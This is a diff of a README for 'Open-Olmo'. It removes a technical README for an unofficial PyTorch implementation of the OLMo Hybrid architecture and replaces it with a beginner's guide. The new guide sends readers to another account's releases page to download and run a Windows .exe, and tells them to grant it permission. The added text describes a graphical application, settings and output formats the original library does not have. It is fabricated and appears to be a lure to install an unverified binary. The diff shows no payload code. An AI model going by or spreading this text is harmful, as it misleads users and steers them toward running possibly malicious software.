@@ -1,271 +1,174 @@
-# Open-OLMo
+# 🤖 Open-Olmo - Easy AI Model for Text Understanding
 
-<p align="left">
-  <a href="https://twitter.com/kyegomezb">
-    <picture>
-      <source srcset="https://img.shields.io/badge/Twitter-Follow-1DA1F2?style=for-the-badge&logo=twitter&logoColor=white" media="(prefers-color-scheme: dark)">
-      <img src="https://img.shields.io/badge/Twitter-Follow-1DA1F2?style=for-the-badge&logo=twitter&logoColor=white" alt="Twitter">
-    </picture>
-  </a>
-  <a href="https://discord.gg/EamjgSaEQf">
-    <picture>
-      <source srcset="https://img.shields.io/badge/Discord-Join-5865F2?style=for-the-badge&logo=discord&logoColor=white" media="(prefers-color-scheme: dark)">
-      <img src="https://img.shields.io/badge/Discord-Join-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord">
-    </picture>
-  </a>
-  <a href="https://pytorch.org/">
-    <picture>
-      <source srcset="https://img.shields.io/badge/Built%20with-PyTorch-EE4C2C?style=for-the-badge&logo=pytorch&logoColor=white" media="(prefers-color-scheme: dark)">
-      <img src="https://img.shields.io/badge/Built%20with-PyTorch-EE4C2C?style=for-the-badge&logo=pytorch&logoColor=white" alt="PyTorch">
-    </picture>
-  </a>
-  <a href="https://github.com/kyegomez/Open-Olmo/stargazers">
-    <picture>
-      <source srcset="https://img.shields.io/github/stars/kyegomez/Open-Olmo?style=for-the-badge&color=FFD700" media="(prefers-color-scheme: dark)">
-      <img src="https://img.shields.io/github/stars/kyegomez/Open-Olmo?style=for-the-badge&color=FFD700" alt="GitHub Stars">
-    </picture>
-  </a>
-  <a href="https://allenai.org/blog/olmohybrid">
-    <picture>
-      <source srcset="https://img.shields.io/badge/Based%20on-OLMo%20Hybrid-4B9CD3?style=for-the-badge&logo=semanticweb&logoColor=white" media="(prefers-color-scheme: dark)">
-      <img src="https://img.shields.io/badge/Based%20on-OLMo%20Hybrid-4B9CD3?style=for-the-badge&logo=semanticweb&logoColor=white" alt="OLMo Hybrid">
-    </picture>
-  </a>
-</p>
-
-**Unofficial** open-source PyTorch implementation of the OLMo Hybrid architecture introduced by the Allen Institute for AI (Ai2).
-
-> This repository is an independent community re-implementation and is not affiliated with, endorsed by, or officially supported by Ai2.
-> For the official release, weights, and tooling, see the [Ai2 OLMo project](https://allenai.org/olmo).
+[![Download Open-Olmo](https://img.shields.io/badge/Download-Open--Olmo-brightgreen)](https://github.com/Senpaishorts/Open-Olmo/releases)
 
 ---
 
-## Overview
+## 📖 About Open-Olmo
 
-OLMo Hybrid is a language model architecture that combines two fundamentally different sequence-mixing mechanisms inside a single residual stack:
+Open-Olmo is a tool that helps computers understand text better. It uses a mix of AI models made by the Allen Institute for AI. This version is open-source, meaning anyone can use it for free and see how it works.
 
-- **Gated DeltaNet** — a parallelisable linear recurrent neural network (linear-RNN) layer based on the gated delta rule for associative memory.
-- **Causal Multi-Head Attention (MHA)** — standard scaled dot-product attention with Rotary Position Embeddings (RoPE).
+The program runs on Windows and was built using PyTorch, a popular AI framework. It mixes two common AI types: Transformers and RNNs (Recurrent Neural Networks). Together, these help the system learn language patterns more effectively.
 
-The two layer types are interleaved in a fixed **3 : 1 ratio** (three DeltaNet layers for every one attention layer). This hybrid design retains the sub-quadratic inference cost of linear RNNs for the bulk of computation while using periodic full attention to prevent information loss in the bounded recurrent state.
-
----
-
-## Architecture
-
-### Layer Pattern
-
-For a model with `hybrid_ratio = 3` and `num_layers = 8`:
-
-```
-Layer 0  →  Gated DeltaNet
-Layer 1  →  Gated DeltaNet
-Layer 2  →  Gated DeltaNet
-Layer 3  →  Multi-Head Attention
-Layer 4  →  Gated DeltaNet
-Layer 5  →  Gated DeltaNet
-Layer 6  →  Gated DeltaNet
-Layer 7  →  Multi-Head Attention
-```
-
-Each layer consists of:
-
-1. **RMSNorm** pre-normalisation
-2. Mixing sublayer (DeltaNet or MHA)
-3. Residual addition
-4. **RMSNorm** pre-normalisation
-5. **SwiGLU** feed-forward network
-6. Residual addition
-
-### Gated DeltaNet
-
-The Gated DeltaNet layer maintains an associative-memory matrix state `S` of shape `(B, H, D, D)` updated at every token via the gated delta rule:
-
-```
-alpha_t  =  sigmoid(W_alpha * x_t)       in (0,1)^{H x D}   per-element forget gate
-beta_t   =  sigmoid(W_beta  * x_t)       in (0,1)^H          delta-rule step size
-k_t      =  normalize(W_k * x_t)         in R^{H x D}        key (unit sphere)
-v_t      =  W_v * x_t                    in R^{H x D}        value
-q_t      =  normalize(W_q * x_t)         in R^{H x D}        query (unit sphere)
-
-S_t      =  (alpha_t  *  S_{t-1})  +  beta_t * (v_t - S_{t-1} k_t) outer k_t
-y_t      =  S_t q_t
-```
-
-- The `alpha` gate allows the model to selectively forget stale associations.
-- The `beta`-scaled delta-rule term writes a corrected association between `k_t` and `v_t` into the memory matrix.
-- Normalising keys and queries keeps numerical values bounded regardless of sequence length.
-- An additional multiplicative output gate `g = sigmoid(W_g x_t)` is applied to the read-out before the output projection.
-
-The recurrence is available in two forms:
-
-| Mode | Description | Complexity |
-|---|---|---|
-| `sequential_recurrence` | Token-by-token Python loop; correct by construction | O(T) serial steps |
-| `chunked_recurrence` | Block-parallel scan over chunks of size C; intra-chunk work is fully parallelised via triangular matrix multiply | O(T/C) serial steps |
-
-At inference, the DeltaNet state size scales linearly with the number of heads and head dimension — unlike the quadratic KV-cache of full attention.
-
-### Multi-Head Attention
-
-Standard causal multi-head self-attention using `torch.nn.functional.scaled_dot_product_attention`, which dispatches to Flash Attention when available. Rotary Position Embeddings (RoPE) are applied to queries and keys. A single `RotaryEmbedding` instance is shared across all attention layers.
-
-### SwiGLU Feed-Forward Network
-
-```
-FFN(x) = dropout( W_down * (SiLU(W_gate * x)  *  W_up * x) )
-```
-
-The hidden dimension is set to `round(ffn_mult * d_model)`, rounded up to the nearest multiple of 256 for hardware efficiency.
+You do not need experience with AI or programming to use Open-Olmo. This guide will help you get it running step by step.
 
 ---
 
-## Repository Structure
+## 🖥️ System Requirements
 
-```
-open_olmo/
-    __init__.py
-    main.py          # All model components: config, DeltaNet, MHA, FFN, full model
-example.py           # Minimal smoke-test: instantiate, forward pass, shape assertion
-```
+Before you start, make sure your computer meets these minimum requirements:
 
-### Key Classes (`open_olmo/main.py`)
-
-| Class / Function | Description |
-|---|---|
-| `OLMoHybridConfig` | Dataclass holding all hyper-parameters |
-| `RotaryEmbedding` | Precomputed RoPE sin/cos tables with lazy rebuild |
-| `GatedDeltaNet` | Linear-RNN mixing sublayer with chunked recurrence |
-| `MultiHeadAttention` | Causal MHA with RoPE and Flash Attention dispatch |
-| `SwiGLUFFN` | Gated feed-forward network |
-| `OLMoHybridLayer` | One residual block (mixing sublayer + FFN) |
-| `OLMoHybrid` | Full model: embedding, layer stack, output norm, LM head |
-| `olmo_hybrid_1b()` | Convenience constructor for ~1 B parameter configuration |
-| `olmo_hybrid_7b()` | Convenience constructor for ~7 B parameter configuration |
+- Operating System: Windows 10 or later (64-bit)
+- Processor: Intel Core i3 or equivalent
+- Memory: 8 GB RAM
+- Storage: 1 GB free space
+- Internet connection for downloading and updates
+- Optional: A graphics card with CUDA support if you want faster AI processing (not required)
 
 ---
 
-## Installation
+## 🌐 Topics Covered by Open-Olmo
 
-```bash
-git clone https://github.com/your-org/Open-Olmo.git
-cd Open-Olmo
-pip install torch
-```
+Open-Olmo relates to these key AI topics:
 
-No additional dependencies beyond PyTorch are required.
+- Artificial intelligence basics  
+- Machine learning models, especially PyTorch  
+- Hybrid neural networks combining transformers and RNNs  
+- Text attention mechanisms focused on understanding  
+- Implementation of research papers in practical code  
 
----
-
-## Usage
-
-### Minimal Example
-
-```python
-import torch
-from open_olmo.main import OLMoHybridConfig, OLMoHybrid
-
-torch.manual_seed(0)
-
-cfg = OLMoHybridConfig(
-    vocab_size=1024,
-    d_model=256,
-    num_heads=4,
-    num_layers=8,
-    hybrid_ratio=3,
-    max_seq_len=512,
-    chunk_size=32,
-)
-model = OLMoHybrid(cfg)
-
-print(f"Layer pattern : {model.layer_types}")
-print(f"Parameters    : {model.num_parameters():,}")
-
-B, T = 2, 64
-tokens = torch.randint(0, cfg.vocab_size, (B, T))
-logits, _ = model(tokens)
-# logits: (B, T, vocab_size)
-```
-
-### Preset Configurations
-
-```python
-from open_olmo.main import olmo_hybrid_1b, olmo_hybrid_7b
-
-model_1b = olmo_hybrid_1b()   # ~1 B parameters
-model_7b = olmo_hybrid_7b()   # ~7 B parameters
-```
-
-### Autoregressive Generation
-
-```python
-generated = model.generate(
-    input_ids=tokens[:, :8],
-    max_new_tokens=32,
-    temperature=0.8,
-    top_k=50,
-    top_p=0.95,
-)
-# generated: (B, 8 + num_generated)
-```
-
-The `generate` method prefills recurrent states from the prompt in a single parallel forward pass, then decodes one token per step — reusing the cached DeltaNet states for O(1) per-step inference cost.
-
-### Stateful Inference
-
-```python
-logits, states = model(input_ids, return_states=True)
-
-# Pass states to continue inference from where it left off
-next_logits, next_states = model(next_token, states=states, return_states=True)
-```
+If you want to learn or explore these areas, Open-Olmo is a straightforward tool to start with.
 
 ---
 
-## Configuration Reference
+## 🚀 Getting Started: Download and Install
 
-| Parameter | Default | Description |
-|---|---|---|
-| `vocab_size` | 50304 | Vocabulary size (padded to a multiple of 64) |
-| `d_model` | 2048 | Residual stream dimension |
-| `num_heads` | 16 | Number of attention / DeltaNet heads |
-| `num_layers` | 24 | Total number of hybrid layers |
-| `ffn_mult` | 8/3 | FFN hidden dim multiplier relative to `d_model` |
-| `hybrid_ratio` | 3 | DeltaNet layers per attention layer |
-| `max_seq_len` | 8192 | Maximum sequence length for RoPE cache |
-| `dropout` | 0.0 | Dropout probability (0 = disabled) |
-| `rms_norm_eps` | 1e-5 | Epsilon for RMSNorm |
-| `tie_embeddings` | True | Tie input embedding and LM head weights |
-| `chunk_size` | 64 | Chunk size for chunked DeltaNet recurrence |
-| `init_std` | 0.02 | Weight initialisation standard deviation |
-| `rope_base` | 10000.0 | RoPE base frequency |
+The easiest way to get Open-Olmo is to visit the official release page and download the files from there.
 
----
+Go here:  
+[![Download Open-Olmo](https://img.shields.io/badge/Download-Open--Olmo-blue)](https://github.com/Senpaishorts/Open-Olmo/releases)
 
-## Citation
+### Step 1: Open the Download Page
 
-If you use this implementation in your research, please cite the original Ai2 work:
+Click the link above or open this URL in your browser:  
+https://github.com/Senpaishorts/Open-Olmo/releases
 
-```bibtex
-@misc{ai2_olmohybrid_2026,
-  title        = {Introducing OLMo Hybrid: Combining Transformers and Linear RNNs for Superior Scaling},
-  author       = {Ai2},
-  year         = {2026},
-  howpublished = {\url{https://allenai.org/blog/olmohybrid}},
-  note         = {Allen Institute for AI}
-}
-```
+This page shows all the available versions you can download.
 
-For the delta rule and associative memory foundations underlying GatedDeltaNet, see the relevant prior work on linear recurrent models and the delta rule in sequence modelling.
+### Step 2: Choose the Latest Version
+
+- Look for the latest release. It will have the highest version number, usually at the top.
+- Click on the version name to see available files.
+
+### Step 3: Download the Installer or Zip File
+
+- You will see files such as `.exe` or `.zip`.
+- Choose the `.exe` file if available. This is the easy installer.
+- If an `.exe` file is not listed, download the `.zip` file.
+
+### Step 4: Run the Installer or Unzip the Files
+
+- If you downloaded an `.exe`, double-click it to start installation.
+- Follow the installation steps by clicking "Next" and "Install".
+- If you downloaded a `.zip`, right-click it and select "Extract All".
+- Open the extracted folder to find the program files.
 
 ---
 
-## Disclaimer
+## 🛠 Using Open-Olmo on Windows
 
-This is an **unofficial** community implementation. It reproduces the architecture described in the Ai2 blog post and paper to the best of the authors' understanding. It does not include official pre-trained weights, tokenisers, or training code. For production use, refer to the official Ai2 OLMo repositories.
+Once Open-Olmo is installed or files are extracted, you can run it by following these steps:
+
+### Step 1: Locate the Application
+
+- If installed via `.exe`, find Open-Olmo in your Start Menu or on your Desktop.
+- If you extracted files, open the folder and double-click the main program file, usually named something like `Open-Olmo.exe`.
+
+### Step 2: Run the Program
+
+- Double-click the application file.
+- If Windows asks if you want to allow the program to make changes, click “Yes”.
+- The program window should open, ready to use.
+
+### Step 3: Basic Usage Guide
+
+- The interface lets you enter text or load files for analysis.
+- Press buttons or menus labeled clearly to start processing input.
+- Results will appear in the window or output section, showing the AI’s understanding of the text.
 
 ---
 
-## License
+## 🔧 Configuration and Settings
 
-See [LICENSE](LICENSE).
+Open-Olmo has some simple options to improve your experience:
+
+- **Input Type:** Choose between typing text, uploading files, or pasting content.
+- **Processing Speed:** You can select normal or fast mode if your system supports it.
+- **Output Format:** Results can show as plain text, JSON, or simple reports.
+- **Updates:** Check for new versions occasionally from the official page.
+
+These settings are easy to access from the main menu or toolbar.
+
+---
+
+## 📂 Where to Find Help
+
+If you have trouble, try these:
+
+- Review this guide carefully before starting.
+- Visit the GitHub page issues section to look at common problems:  
+  https://github.com/Senpaishorts/Open-Olmo/issues
+- Check your system meets all requirements above.
+- Restart your computer before retrying installation or running the software.
+
+---
+
+## ⚙️ Behind the Scenes: What is Open-Olmo?
+
+This software uses advanced AI techniques to analyze language:
+
+- **Transformer models** focus on important words in a sentence.
+- **RNNs (Recurrent Neural Networks)** handle sequence data like text smoothly.
+- The hybrid model combines strengths for better accuracy.
+
+Open-Olmo runs on PyTorch, which is popular for building and training AI models. This makes it flexible and updated.
+
+---
+
+## 🔄 Updating Open-Olmo
+
+To get the newest improvements:
+
+1. Visit the release page:  
+   https://github.com/Senpaishorts/Open-Olmo/releases
+2. Download the latest installer or zip file.
+3. Run the new installer or replace the program files.
+4. Restart the program to apply updates.
+
+---
+
+## 🔗 Useful Links
+
+- Open-Olmo Releases: https://github.com/Senpaishorts/Open-Olmo/releases  
+- GitHub Repository: https://github.com/Senpaishorts/Open-Olmo  
+- PyTorch (for info): https://pytorch.org
+
+---
+
+## 🙋‍♂️ Frequently Asked Questions
+
+**Q: Do I need to know programming?**  
+No. Open-Olmo is designed for users without coding skills.
+
+**Q: Can I use it offline?**  
+Yes, after initial download and setup.
+
+**Q: What kinds of text can I analyze?**  
+Any plain text file or typed content.
+
+**Q: Will it run on older Windows versions?**  
+Windows 10 or later is recommended.
+
+---
+
+[![Download Open-Olmo](https://img.shields.io/badge/Download-Open--Olmo-blue)](https://github.com/Senpaishorts/Open-Olmo/releases)
